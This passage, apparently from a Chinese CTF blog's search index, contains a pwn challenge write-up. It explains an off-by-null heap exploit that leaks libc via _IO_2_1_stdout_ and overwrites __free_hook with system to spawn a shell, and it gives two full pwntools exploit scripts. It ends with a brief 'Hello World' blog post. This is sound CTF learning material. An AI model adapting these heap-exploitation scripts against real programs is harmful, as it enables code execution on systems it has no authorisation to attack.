class="hljs-number">0xc6a0</span>))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/SU7RO9smPb4J5AM.png"></p><p>接下来把_IO_2_1_stdout_申请下来并修改成<code>p64(0xfbad3887)+p64(0)*3 + p8(0)</code>，就可以泄露libc了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#7</span><br>edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>同样的，把free_hook链到tcache bin上，这次我用到了第一次泄露堆地址申请的小堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">6</span>, p64(free_hook))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/Bb7c1CJalHUqtfQ.png"></p><p>再把free_hook申请下来，改成system的地址，接着free一块写着”/bin/sh\x00”字符串的堆块就能拿到shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">4</span>, p64(system))<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p><strong>本地调试版</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>    p = process(binary)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;123.60.63.28&#x27;</span>, <span class="hljs-number">49156</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;length\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Name:\n&#x27;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span><br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>add(<span class="hljs-number">0x18</span>)<br><br>add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x4f0</span>)  <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br><br>edit(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x100</span>+<span class="hljs-number">0x81</span>)+p64(heap_base+<span class="hljs-number">0x2e0</span>)*<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;\x01&#x27;</span>*<span class="hljs-number">0x78</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(<span class="hljs-number">0x180</span>))<br>free(<span class="hljs-number">4</span>)     <span class="hljs-comment"># offbynul</span><br><br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0xf0</span>)   <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">4</span>, p16(<span class="hljs-number">0xc6a0</span>))<br><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#7</span><br>edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1eb980</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">6</span>, p64(free_hook))<br><br>add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">4</span>, p64(system))<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>常规爆破版</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(binary)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;length\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;\n&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    add(<span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">0x10</span>)<br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">1</span>)<br>    add(<span class="hljs-number">0x10</span>)<br>    show(<span class="hljs-number">0</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Name:\n&#x27;</span>)<br>    heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span><br>    success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>    add(<span class="hljs-number">0x18</span>)<br><br>    add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x4f0</span>)  <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br><br>    edit(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x100</span>+<span class="hljs-number">0x81</span>)+p64(heap_base+<span class="hljs-number">0x2e0</span>)*<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;\x01&#x27;</span>*<span class="hljs-number">0x78</span>)<br>    edit(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(<span class="hljs-number">0x180</span>))<br>    free(<span class="hljs-number">4</span>)     <span class="hljs-comment"># offbynul</span><br><br>    free(<span class="hljs-number">6</span>)<br>    free(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">0xf0</span>)   <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>    edit(<span class="hljs-number">4</span>, p16(<span class="hljs-number">0xc6a0</span>))<br><br>    add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#6</span><br>    add(<span class="hljs-number">0x78</span>)   <span class="hljs-comment">#7</span><br>    edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0xfbad3887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>))<br>    libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1eb980</span><br>    <span class="hljs-keyword">if</span> libc_base &lt; <span class="hljs-number">0x7f0000000000</span>:<br>        <span class="hljs-keyword">raise</span> <span class="hljs-string">&quot;once again&quot;</span><br>    success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">4</span>)<br>    edit(<span class="hljs-number">6</span>, p64(free_hook))<br><br>    add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>    edit(<span class="hljs-number">4</span>, p64(system))<br>    edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>    free(<span class="hljs-number">1</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            local = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> local:<br>                p = process(binary)<br>                libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                p = remote(<span class="hljs-string">&#x27;123.60.63.28&#x27;</span>, <span class="hljs-number">49156</span>)<br>                libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>            exp()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            p.close()<br></code></pre></td></tr></table></figure><h2 id="BabyPwn"><a href="#BabyPwn" class="headerlink" title="BabyPwn"></a>BabyPwn</h2><p>Bios，摸了，根本没看。队友搞了一天，最后还是卡住了，等wp出了再来复现</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>off by null</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/10/10/hello-world/"/>
    <url>/2021/10/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>时隔一年多又把博客整起来了，算是新的开始吧，希望能养成写博客记录的习惯，给自己加个油！</p><p>博客主要记录CTF-Pwn的一些题解和二进制安全的学习点滴</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
